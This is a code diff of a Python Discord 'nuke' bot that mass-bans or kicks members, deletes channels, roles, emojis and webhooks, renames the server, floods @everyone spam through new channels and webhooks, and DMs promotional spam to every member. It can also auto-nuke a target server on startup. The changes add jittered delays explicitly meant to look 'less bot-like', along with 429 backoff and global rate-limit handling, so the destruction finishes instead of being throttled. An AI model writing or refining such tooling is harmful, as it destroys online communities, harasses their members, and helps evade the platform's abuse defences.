@@ -1,11 +1,12 @@
 # language: Python 3.11+, file: bot.py, target: Discord + Railway
-# Pure Nuke Bot — prefix only + whitelist + promo
+# Nuke Bot — prefix + whitelist + promo + anti rate-limit
 
 from __future__ import annotations
 
 import os
 import sys
 import json
+import random
 import asyncio
 import logging
 import traceback
@@ -93,8 +94,8 @@ PREFIX = first_env("PREFIX", "BOT_PREFIX", default="!") or "!"
 PORT = env_int("PORT", 8080)
 
 NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
-SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 50))
-SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 15))
+SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 30))
+SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 8))
 SPAM_TEXT = first_env("SPAM_TEXT", default="") or PROMO
 WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
 BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
@@ -110,21 +111,24 @@ CHANGE_ICON = env_bool("CHANGE_ICON", False)
 ICON_URL = first_env("ICON_URL")
 CHANGE_BANNER = env_bool("CHANGE_BANNER", False)
 BANNER_URL = first_env("BANNER_URL")
-CREATE_ROLES = max(0, env_int("CREATE_ROLES", 10))
+CREATE_ROLES = max(0, env_int("CREATE_ROLES", 5))
 ROLE_NAME = first_env("ROLE_NAME", default="nuked") or "nuked"
 CHANNEL_NAME = first_env("CHANNEL_NAME", default="nuked") or "nuked"
-CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 5))
-CREATE_VOICE = max(0, env_int("CREATE_VOICE", 10))
+CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 3))
+CREATE_VOICE = max(0, env_int("CREATE_VOICE", 5))
 DM_MESSAGE = first_env("DM_MESSAGE") or PROMO
 LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
 AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
-CONCURRENCY = max(1, min(env_int("CONCURRENCY", 5), 15))
-RATE_LIMIT_DELAY = max(0.0, env_float("RATE_LIMIT_DELAY", 0.15))
+# Safer defaults to stay under Discord global limits
+CONCURRENCY = max(1, min(env_int("CONCURRENCY", 2), 8))
+RATE_LIMIT_DELAY = max(0.25, env_float("RATE_LIMIT_DELAY", 0.45))
+PHASE_PAUSE = max(0.5, env_float("PHASE_PAUSE", 2.0))
+MAX_RETRIES = max(1, env_int("MAX_RETRIES", 4))
+CMD_COOLDOWN = max(0.0, env_float("CMD_COOLDOWN", 8.0))
 PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
 VANITY = first_env("VANITY")
 KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))
 
-# permanent whitelist from env + runtime file
 WHITELIST: Set[int] = parse_ids(first_env("WHITELIST_GUILDS", "WHITELIST", default=""))
 
 
@@ -134,7 +138,7 @@ def load_whitelist() -> None:
         try:
             data = json.loads(WHITELIST_FILE.read_text(encoding="utf-8"))
             for x in data:
-                if isinstance(x, int) or (isinstance(x, str) and x.isdigit()):
+                if isinstance(x, int) or (isinstance(x, str) and str(x).isdigit()):
                     WHITELIST.add(int(x))
         except Exception as e:
             log.warning("whitelist load: %s", e)
@@ -142,10 +146,7 @@ def load_whitelist() -> None:
 
 def save_whitelist() -> None:
     try:
-        WHITELIST_FILE.write_text(
-            json.dumps(sorted(WHITELIST), indent=2),
-            encoding="utf-8",
-        )
+        WHITELIST_FILE.write_text(json.dumps(sorted(WHITELIST), indent=2), encoding="utf-8")
     except Exception as e:
         log.warning("whitelist save: %s", e)
 
@@ -158,12 +159,10 @@ load_whitelist()
 
 log.info("=== NUKE BOT BOOT ===")
 log.info("python=%s", sys.version.split()[0])
-keys = sorted(os.environ.keys())
-log.info("ENV KEYS (%s): %s", len(keys), ", ".join(keys))
-log.info("PORT=%s PREFIX=%s", PORT, PREFIX)
+log.info("ENV KEYS (%s): %s", len(os.environ), ", ".join(sorted(os.environ.keys())))
+log.info("PORT=%s PREFIX=%s CONCURRENCY=%s DELAY=%.2f", PORT, PREFIX, CONCURRENCY, RATE_LIMIT_DELAY)
 log.info("TOKEN found=%s len=%s", bool(TOKEN), len(TOKEN))
-log.info("OWNER_IDS=%s", OWNER_IDS or "(empty)")
-log.info("WHITELIST=%s", WHITELIST or "(empty)")
+log.info("OWNER_IDS=%s WHITELIST=%s", OWNER_IDS or "(empty)", WHITELIST or "(empty)")
 
 intents = discord.Intents.none()
 intents.guilds = True
@@ -181,8 +180,10 @@ bot = commands.Bot(
 )
 
 sem: asyncio.Semaphore | None = None
+action_lock = asyncio.Lock()
 _http: aiohttp.ClientSession | None = None
 _bot_ready = False
+_global_cooldown_until = 0.0
 
 
 def owner_only():
@@ -217,32 +218,60 @@ async def say(msg: str):
     await external_log(msg)
 
 
+async def jitter_sleep(base: float | None = None):
+    delay = base if base is not None else RATE_LIMIT_DELAY
+    # +20–60% jitter so patterns look less bot-like
+    await asyncio.sleep(delay * (1.2 + random.random() * 0.4))
+
+
 async def limited(coro):
+    """Run under semaphore + respect global cooldown + exponential 429 backoff."""
+    global _global_cooldown_until
     assert sem is not None
+
     async with sem:
-        try:
-            return await coro
-        except HTTPException as e:
-            if e.status == 429:
-                retry = 1.5
-                try:
-                    if e.response is not None:
-                        retry = float(e.response.headers.get("Retry-After", 1.5))
-                except Exception:
-                    pass
-                await asyncio.sleep(retry)
-                try:
-                    return await coro
-                except Exception:
-                    return None
-            return None
-        except (Forbidden, NotFound):
-            return None
-        except Exception:
-            return None
-        finally:
-            if RATE_LIMIT_DELAY:
-                await asyncio.sleep(RATE_LIMIT_DELAY)
+        now = asyncio.get_event_loop().time()
+        if now < _global_cooldown_until:
+            await asyncio.sleep(_global_cooldown_until - now)
+
+        last_err = None
+        for attempt in range(MAX_RETRIES):
+            try:
+                result = await coro
+                await jitter_sleep()
+                return result
+            except HTTPException as e:
+                last_err = e
+                if e.status == 429:
+                    retry = 2.0 * (2 ** attempt)
+                    try:
+                        if e.response is not None:
+                            ra = e.response.headers.get("Retry-After")
+                            if ra is not None:
+                                retry = float(ra) + random.uniform(0.3, 1.0)
+                            # global rate limit flag
+                            if e.response.headers.get("X-RateLimit-Global", "").lower() == "true":
+                                _global_cooldown_until = (
+                                    asyncio.get_event_loop().time() + retry
+                                )
+                                log.warning("GLOBAL rate limit — pause %.1fs", retry)
+                    except Exception:
+                        pass
+                    log.warning("429 retry %s/%s wait %.1fs", attempt + 1, MAX_RETRIES, retry)
+                    await asyncio.sleep(retry)
+                    continue
+                if e.status in (500, 502, 503, 504):
+                    await asyncio.sleep(1.5 * (attempt + 1))
+                    continue
+                return None
+            except (Forbidden, NotFound):
+                return None
+            except Exception as e:
+                last_err = e
+                return None
+        if last_err:
+            log.warning("gave up after retries: %s", last_err)
+        return None
 
 
 async def gather_limited(coros: Iterable):
@@ -250,6 +279,10 @@ async def gather_limited(coros: Iterable):
     if not tasks:
         return []
     return await asyncio.gather(*tasks, return_exceptions=True)
+
+
+async def phase_pause():
+    await asyncio.sleep(PHASE_PAUSE + random.uniform(0, 0.8))
 
 
 async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
@@ -419,10 +452,20 @@ async def action_spam_messages(channels: List[discord.TextChannel], text: str, t
         for _ in range(times):
             try:
                 await ch.send(text[:2000], allowed_mentions=discord.AllowedMentions(everyone=True))
+            except HTTPException as e:
+                if e.status == 429:
+                    ra = 1.5
+                    try:
+                        if e.response is not None:
+                            ra = float(e.response.headers.get("Retry-After", 1.5))
+                    except Exception:
+                        pass
+                    await asyncio.sleep(ra + 0.5)
+                    continue
+                break
             except Exception:
                 break
-            if RATE_LIMIT_DELAY:
-                await asyncio.sleep(RATE_LIMIT_DELAY)
+            await jitter_sleep()
         return 1
 
     await gather_limited(one(ch) for ch in channels)
@@ -440,16 +483,27 @@ async def action_webhook_spam(channels: List[discord.TextChannel], text: str, ti
                         username="NUKE",
                         allowed_mentions=discord.AllowedMentions(everyone=True),
                     )
+                except HTTPException as e:
+                    if e.status == 429:
+                        ra = 1.5
+                        try:
+                            if e.response is not None:
+                                ra = float(e.response.headers.get("Retry-After", 1.5))
+                        except Exception:
+                            pass
+                        await asyncio.sleep(ra + 0.5)
+                        continue
+                    break
                 except Exception:
                     break
-                if RATE_LIMIT_DELAY:
-                    await asyncio.sleep(RATE_LIMIT_DELAY)
+                await jitter_sleep()
         except Exception:
             for _ in range(times):
                 try:
                     await ch.send(text[:2000], allowed_mentions=discord.AllowedMentions(everyone=True))
                 except Exception:
                     break
+                await jitter_sleep()
         finally:
             if wh:
                 try:
@@ -499,42 +553,55 @@ async def full_nuke(guild: discord.Guild):
         await say(f"[-] BLOCKED whitelist → {guild.name} ({guild.id})")
         return
 
-    await say(f"[*] NUKE START → {guild.name} ({guild.id})")
+    if action_lock.locked():
+        await say("[-] Une action lourde tourne déjà — attends.")
+        return
 
-    if BAN_ALL:
-        await say(f"[+] Ban/Kick: {await action_ban_all(guild, kick=KICK_INSTEAD)}")
-    if PRUNE_DAYS > 0:
-        await say(f"[+] Prune: {await action_prune(guild, PRUNE_DAYS)}")
-    if DELETE_WEBHOOKS:
-        await say(f"[+] Webhooks: {await action_delete_webhooks(guild)}")
-    await say(f"[+] Channels deleted: {await action_delete_channels(guild)}")
-    if DELETE_ROLES:
-        await say(f"[+] Roles deleted: {await action_delete_roles(guild)}")
-    if DELETE_EMOJIS:
-        await say(f"[+] Emojis: {await action_delete_emojis(guild)}")
-    if DELETE_STICKERS:
-        await say(f"[+] Stickers: {await action_delete_stickers(guild)}")
-    await say(f"[+] Rename: {await action_rename(guild, NUKE_NAME)}")
-    if VANITY:
-        await say(f"[+] Vanity: {await action_vanity(guild, VANITY)}")
-    if CREATE_ROLES:
-        await say(f"[+] Roles created: {await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
-    if CREATE_CATEGORIES:
-        await say(f"[+] Categories: {await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
-    if CREATE_VOICE:
-        await say(f"[+] Voice: {await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
+    async with action_lock:
+        await say(f"[*] NUKE START → {guild.name} ({guild.id})")
 
-    channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
-    await say(f"[+] Text channels: {len(channels)}")
-    if channels and SPAM_MESSAGES > 0:
-        text = SPAM_TEXT if SPAM_TEXT else PROMO
-        if WEBHOOK_SPAM:
-            await action_webhook_spam(channels, text, SPAM_MESSAGES)
-        else:
-            await action_spam_messages(channels, text, SPAM_MESSAGES)
-        await say("[+] Spam + promo done")
+        if BAN_ALL:
+            await say(f"[+] Ban/Kick: {await action_ban_all(guild, kick=KICK_INSTEAD)}")
+            await phase_pause()
+        if PRUNE_DAYS > 0:
+            await say(f"[+] Prune: {await action_prune(guild, PRUNE_DAYS)}")
+            await phase_pause()
+        if DELETE_WEBHOOKS:
+            await say(f"[+] Webhooks: {await action_delete_webhooks(guild)}")
+            await phase_pause()
+        await say(f"[+] Channels deleted: {await action_delete_channels(guild)}")
+        await phase_pause()
+        if DELETE_ROLES:
+            await say(f"[+] Roles deleted: {await action_delete_roles(guild)}")
+            await phase_pause()
+        if DELETE_EMOJIS:
+            await say(f"[+] Emojis: {await action_delete_emojis(guild)}")
+        if DELETE_STICKERS:
+            await say(f"[+] Stickers: {await action_delete_stickers(guild)}")
+            await phase_pause()
+        await say(f"[+] Rename: {await action_rename(guild, NUKE_NAME)}")
+        if VANITY:
+            await say(f"[+] Vanity: {await action_vanity(guild, VANITY)}")
+        await phase_pause()
+        if CREATE_ROLES:
+            await say(f"[+] Roles created: {await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
+        if CREATE_CATEGORIES:
+            await say(f"[+] Categories: {await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
+        if CREATE_VOICE:
+            await say(f"[+] Voice: {await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
+        await phase_pause()
 
-    await say("[*] NUKE COMPLETE")
+        channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
+        await say(f"[+] Text channels: {len(channels)}")
+        if channels and SPAM_MESSAGES > 0:
+            text = SPAM_TEXT if SPAM_TEXT else PROMO
+            if WEBHOOK_SPAM:
+                await action_webhook_spam(channels, text, SPAM_MESSAGES)
+            else:
+                await action_spam_messages(channels, text, SPAM_MESSAGES)
+            await say("[+] Spam + promo done")
+
+        await say("[*] NUKE COMPLETE")
 
 
 async def health_handler(_request):
@@ -563,7 +630,7 @@ async def on_ready():
     if AUTO_NUKE_GUILD.isdigit():
         gid = int(AUTO_NUKE_GUILD)
         if is_whitelisted(gid):
-            log.warning("AUTO_NUKE blocked — guild whitelisted %s", gid)
+            log.warning("AUTO_NUKE blocked — whitelisted %s", gid)
         else:
             g = bot.get_guild(gid)
             if g:
@@ -582,6 +649,12 @@ async def keepalive():
 
 @bot.event
 async def on_command_error(ctx: commands.Context, error: Exception):
+    if isinstance(error, commands.CommandOnCooldown):
+        try:
+            await ctx.send(f"Cooldown `{error.retry_after:.1f}s` — anti rate-limit.", delete_after=5)
+        except Exception:
+            pass
+        return
     if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
         return
     log.error("cmd: %s", error)
@@ -596,14 +669,13 @@ async def on_error(event_method, *args, **kwargs):
     log.error("event %s\n%s", event_method, traceback.format_exc())
 
 
-# ═══════════════ WHITELIST (owner) ═══════════════
+# ── whitelist ──
 
 @bot.command(name="whitelist")
 @owner_only()
+@commands.cooldown(2, 3, commands.BucketType.user)
 async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: Optional[str] = None):
-    """!whitelist add <id> | !whitelist remove <id> | !whitelist list"""
     action = action.lower().strip()
-
     if action in ("list", "ls", "show"):
         if not WHITELIST:
             await ctx.send("Whitelist vide.")
@@ -611,7 +683,6 @@ async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: 
         lines = "\n".join(str(i) for i in sorted(WHITELIST))
         await ctx.send(f"**Whitelist**\n```{lines[:1900]}```")
         return
-
     if action in ("add", "server", "+") and server_id:
         if not server_id.isdigit():
             await ctx.send("ID invalide.")
@@ -619,9 +690,8 @@ async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: 
         gid = int(server_id)
         WHITELIST.add(gid)
         save_whitelist()
-        await ctx.send(f"Whitelisted `{gid}` — ce serveur ne sera **jamais** nuké.")
+        await ctx.send(f"Whitelisted `{gid}` — never nuke.")
         return
-
     if action in ("remove", "rm", "del", "-") and server_id:
         if not server_id.isdigit():
             await ctx.send("ID invalide.")
@@ -629,105 +699,126 @@ async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: 
         gid = int(server_id)
         WHITELIST.discard(gid)
         save_whitelist()
-        await ctx.send(f"Retiré de la whitelist: `{gid}`")
+        await ctx.send(f"Retiré: `{gid}`")
         return
-
-    # !whitelist <id>  → add
     if action.isdigit() and server_id is None:
         gid = int(action)
         WHITELIST.add(gid)
         save_whitelist()
-        await ctx.send(f"Whitelisted `{gid}` — never nuke.")
+        await ctx.send(f"Whitelisted `{gid}`")
         return
-
     await ctx.send(
-        f"```\n"
-        f"{PREFIX}whitelist add <serverID>\n"
-        f"{PREFIX}whitelist remove <serverID>\n"
-        f"{PREFIX}whitelist list\n"
-        f"{PREFIX}whitelist <serverID>\n"
-        f"```"
+        f"```{PREFIX}whitelist add|remove|list <id>\n{PREFIX}unwhitelist <id>```"
     )
 
 
 @bot.command(name="unwhitelist")
 @owner_only()
+@commands.cooldown(2, 3, commands.BucketType.user)
 async def cmd_unwhitelist(ctx: commands.Context, server_id: str):
-    """!unwhitelist <serverID>"""
     if not server_id.isdigit():
         await ctx.send("ID invalide.")
         return
     gid = int(server_id)
     WHITELIST.discard(gid)
     save_whitelist()
-    await ctx.send(f"Retiré de la whitelist: `{gid}`")
+    await ctx.send(f"Retiré: `{gid}`")
 
 
-# ═══════════════ NUKE COMMANDS ═══════════════
+# ── nuke cmds (cooldown lourd) ──
+
+def heavy_cd():
+    return commands.cooldown(1, CMD_COOLDOWN, commands.BucketType.user)
+
 
 @bot.command(name="nuke")
 @owner_only()
+@heavy_cd()
 async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
     target = bot.get_guild(guild_id) if guild_id else ctx.guild
     if not target:
         await ctx.send("Guild introuvable.")
         return
     if is_whitelisted(target.id):
-        await ctx.send(f"⛔ Serveur **whitelist** (`{target.id}`). Nuke refusé.")
+        await ctx.send(f"⛔ Whitelist `{target.id}`")
+        return
+    if action_lock.locked():
+        await ctx.send("Une action tourne déjà — attends la fin.")
         return
     try:
         await ctx.message.delete()
     except Exception:
         pass
-    await ctx.send(f"Nuke → **{target.name}**\n{PROMO}")
+    await ctx.send(f"Nuke → **{target.name}** (mode safe rate-limit)\n{PROMO}")
     await full_nuke(target)
 
 
 @bot.command(name="banall")
 @owner_only()
+@heavy_cd()
 async def cmd_banall(ctx: commands.Context):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
-    n = await action_ban_all(ctx.guild, False)
+    if action_lock.locked():
+        await ctx.send("Action en cours.")
+        return
+    async with action_lock:
+        n = await action_ban_all(ctx.guild, False)
     await ctx.send(f"Banned: {n}\n{PROMO}")
 
 
 @bot.command(name="kickall")
 @owner_only()
+@heavy_cd()
 async def cmd_kickall(ctx: commands.Context):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
-    n = await action_ban_all(ctx.guild, True)
+    if action_lock.locked():
+        await ctx.send("Action en cours.")
+        return
+    async with action_lock:
+        n = await action_ban_all(ctx.guild, True)
     await ctx.send(f"Kicked: {n}\n{PROMO}")
 
 
 @bot.command(name="delchannels")
 @owner_only()
+@heavy_cd()
 async def cmd_delchannels(ctx: commands.Context):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
-    n = await action_delete_channels(ctx.guild)
+    if action_lock.locked():
+        await ctx.send("Action en cours.")
+        return
+    async with action_lock:
+        n = await action_delete_channels(ctx.guild)
     await ctx.send(f"Channels: {n}\n{PROMO}")
 
 
 @bot.command(name="delroles")
 @owner_only()
+@heavy_cd()
 async def cmd_delroles(ctx: commands.Context):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
-    n = await action_delete_roles(ctx.guild)
+    if action_lock.locked():
+        await ctx.send("Action en cours.")
+        return
+    async with action_lock:
+        n = await action_delete_roles(ctx.guild)
     await ctx.send(f"Roles: {n}\n{PROMO}")
 
 
 @bot.command(name="delemojis")
 @owner_only()
+@heavy_cd()
 async def cmd_delemojis(ctx: commands.Context):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
     e = await action_delete_emojis(ctx.guild)
     s = await action_delete_stickers(ctx.guild)
@@ -736,24 +827,31 @@ async def cmd_delemojis(ctx: commands.Context):
 
 @bot.command(name="spam")
 @owner_only()
-async def cmd_spam(ctx: commands.Context, count: int = 20):
+@heavy_cd()
+async def cmd_spam(ctx: commands.Context, count: int = 15):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
-    channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
-    text = SPAM_TEXT if SPAM_TEXT else PROMO
-    if WEBHOOK_SPAM:
-        await action_webhook_spam(channels, text, SPAM_MESSAGES)
-    else:
-        await action_spam_messages(channels, text, SPAM_MESSAGES)
+    if action_lock.locked():
+        await ctx.send("Action en cours.")
+        return
+    count = max(1, min(count, 40))
+    async with action_lock:
+        channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
+        text = SPAM_TEXT if SPAM_TEXT else PROMO
+        if WEBHOOK_SPAM:
+            await action_webhook_spam(channels, text, SPAM_MESSAGES)
+        else:
+            await action_spam_messages(channels, text, SPAM_MESSAGES)
     await ctx.send(f"Spam: {len(channels)} channels\n{PROMO}")
 
 
 @bot.command(name="rename")
 @owner_only()
+@commands.cooldown(1, 5, commands.BucketType.user)
 async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
     ok = await action_rename(ctx.guild, name)
     await ctx.send(f"Rename: {ok}\n{PROMO}")
@@ -761,20 +859,26 @@ async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
 
 @bot.command(name="dmall")
 @owner_only()
+@heavy_cd()
 async def cmd_dmall(ctx: commands.Context, *, message: Optional[str] = None):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
+        return
+    if action_lock.locked():
+        await ctx.send("Action en cours.")
         return
     msg = message if message else PROMO
-    n = await action_dm_all(ctx.guild, msg)
+    async with action_lock:
+        n = await action_dm_all(ctx.guild, msg)
     await ctx.send(f"DM: {n}\n{PROMO}")
 
 
 @bot.command(name="prune")
 @owner_only()
+@heavy_cd()
 async def cmd_prune(ctx: commands.Context, days: int = 1):
     if is_whitelisted(ctx.guild.id):
-        await ctx.send("⛔ Whitelist — refusé.")
+        await ctx.send("⛔ Whitelist")
         return
     n = await action_prune(ctx.guild, days)
     await ctx.send(f"Pruned: {n}\n{PROMO}")
@@ -782,6 +886,7 @@ async def cmd_prune(ctx: commands.Context, days: int = 1):
 
 @bot.command(name="leave")
 @owner_only()
+@commands.cooldown(1, 5, commands.BucketType.user)
 async def cmd_leave(ctx: commands.Context):
     await ctx.send(f"Leaving\n{PROMO}")
     await ctx.guild.leave()
@@ -789,6 +894,7 @@ async def cmd_leave(ctx: commands.Context):
 
 @bot.command(name="guilds")
 @owner_only()
+@commands.cooldown(2, 5, commands.BucketType.user)
 async def cmd_guilds(ctx: commands.Context):
     lines = []
     for g in bot.guilds:
@@ -799,40 +905,37 @@ async def cmd_guilds(ctx: commands.Context):
 
 @bot.command(name="status")
 @owner_only()
+@commands.cooldown(2, 5, commands.BucketType.user)
 async def cmd_status(ctx: commands.Context):
     await ctx.send(
         f"**{bot.user}**\n"
-        f"Guilds: `{len(bot.guilds)}` | Latency: `{round(bot.latency * 1000)}ms`\n"
-        f"Whitelist: `{len(WHITELIST)}` | Owners: `{OWNER_IDS}`\n"
+        f"Guilds `{len(bot.guilds)}` | `{round(bot.latency * 1000)}ms`\n"
+        f"Concurrency `{CONCURRENCY}` | Delay `{RATE_LIMIT_DELAY}s` | CD `{CMD_COOLDOWN}s`\n"
+        f"Whitelist `{len(WHITELIST)}` | Lock `{'busy' if action_lock.locked() else 'free'}`\n"
         f"{PROMO}"
     )
 
 
 @bot.command(name="helpnuke")
 @owner_only()
+@commands.cooldown(1, 3, commands.BucketType.user)
 async def cmd_help(ctx: commands.Context):
     await ctx.send(
         f"```\n"
-        f"{PREFIX}nuke [id]              nuke complet\n"
-        f"{PREFIX}banall / kickall\n"
-        f"{PREFIX}delchannels / delroles / delemojis\n"
-        f"{PREFIX}spam [n]              channels + promo flood\n"
-        f"{PREFIX}rename [name]\n"
-        f"{PREFIX}dmall [msg]           défaut = promo\n"
-        f"{PREFIX}prune [days]\n"
-        f"{PREFIX}whitelist add <id>    never nuke\n"
-        f"{PREFIX}whitelist remove <id>\n"
-        f"{PREFIX}whitelist list\n"
+        f"{PREFIX}nuke [id]  {PREFIX}banall  {PREFIX}kickall\n"
+        f"{PREFIX}delchannels  {PREFIX}delroles  {PREFIX}delemojis\n"
+        f"{PREFIX}spam [n]  {PREFIX}rename  {PREFIX}dmall  {PREFIX}prune\n"
+        f"{PREFIX}whitelist add|remove|list <id>\n"
         f"{PREFIX}unwhitelist <id>\n"
-        f"{PREFIX}leave / guilds / status\n"
-        f"```\n{PROMO}"
+        f"{PREFIX}leave  {PREFIX}guilds  {PREFIX}status\n"
+        f"```\nAnti rate-limit: cooldown {CMD_COOLDOWN}s, concurrency {CONCURRENCY}, delay {RATE_LIMIT_DELAY}s\n{PROMO}"
     )
 
 
 async def runner():
     await start_health_server()
     if not TOKEN:
-        log.error("NO TOKEN — set TOKEN on Railway")
+        log.error("NO TOKEN")
         while True:
             await asyncio.sleep(3600)
         return
@@ -841,7 +944,7 @@ async def runner():
         async with bot:
             await bot.start(TOKEN, reconnect=True)
     except discord.LoginFailure:
-        log.error("LOGIN FAILED — reset token")
+        log.error("LOGIN FAILED")
         while True:
             await asyncio.sleep(3600)
     except Exception:
